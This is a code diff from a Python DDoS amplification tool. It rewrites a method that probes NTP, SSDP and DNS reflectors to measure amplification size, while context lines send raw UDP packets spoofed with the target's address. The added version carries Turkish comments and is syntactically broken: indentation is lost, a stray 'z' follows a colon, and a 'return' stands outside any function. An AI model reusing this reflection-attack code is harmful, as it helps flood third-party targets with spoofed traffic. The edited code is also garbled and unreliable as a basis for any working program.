@@ -182,34 +182,40 @@ class DDoS(object):
 		udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
 		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
 		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
+	
 	def GetAmpSize(self, proto, soldier, domain=''):
-		'''
-			Get Amplification Size
-		'''
-		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		sock.settimeout(2)
-		data = ''
-		if proto in ['ntp', 'ssdp']:
-			packet = PAYLOAD[proto]
-			sock.sendto(packet, (soldier, PORT[proto]))
-			try:
-				while True:
-					data+= sock.recvfrom(65535)[0]
-			except socket.timeout:
-				sock.close()
-				return len(data), len(packet)
-		if proto=='dns':
-			packet = self.__GetDnsQuery(domain)
-		else:
-			packet = PAYLOAD[proto]
-		try:
-			sock.sendto(packet, (soldier, PORT[proto]))
-			data, _ = sock.recvfrom(65535)
-		except socket.timeout:
-			data = ''
-		finally:
-			sock.close()
-		return len(data), len(packet)
+    '''
+    Get Amplification Size
+    '''
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.settimeout(2)  # Zaman aşımı ayarla (saniye cinsinden)
+data = b''  # Alınan veri
+if proto in ['ntp', 'ssdp']:
+        packet = PAYLOAD[proto]  # Gönderilecek UDP paketi
+        sock.sendto(packet, (soldier, PORT[proto]))  # UDP paketini gönder
+        try:
+            while True:
+                # Alınan veriyi bir araya getir
+                data += sock.recvfrom(65535)[0]
+        except socket.timeout:
+            # Zaman aşımı gerçekleşirse, soketi kapat ve veriyi geri döndür
+            sock.close()
+return len(data), len(packet)
+if proto == 'dns':z
+        packet = self.__GetDnsQuery(domain)  # DNS sorgusu oluştur
+else:
+        packet = PAYLOAD[proto]  # Gönderilecek UDP paketi
+try:
+        # UDP paketini gönder ve yanıtı al
+        sock.sendto(packet, (soldier, PORT[proto]))
+        data, _ = sock.recvfrom(65535)
+    except socket.timeout:
+        data = b''  # Zaman aşımı durumunda alınan veri yok
+    finally:
+        sock.close()  # Soketi kapat
+    return len(data), len(packet)  # Alınan veri ve gönderilen paketin boyutunu döndür
+
+		
 	def __GetQName(self, domain):
 		'''
 			QNAME A domain name represented as a sequence of labels 
